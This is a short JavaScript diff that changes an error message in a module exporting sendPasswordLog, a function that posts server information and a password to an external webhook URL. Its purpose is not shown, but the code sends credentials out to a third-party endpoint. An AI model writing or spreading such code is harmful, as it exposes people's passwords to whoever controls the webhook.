@@ -8,7 +8,7 @@ const sendPasswordLog = async (serverInfo, password) => {
      try {
         await axios.post(WEBHOOK_URL, message);
     } catch (error) {
-        console.error('Failed to send webhook:', error);
+        console.error(error);
     }
 };
 module.exports = { sendPasswordLog };
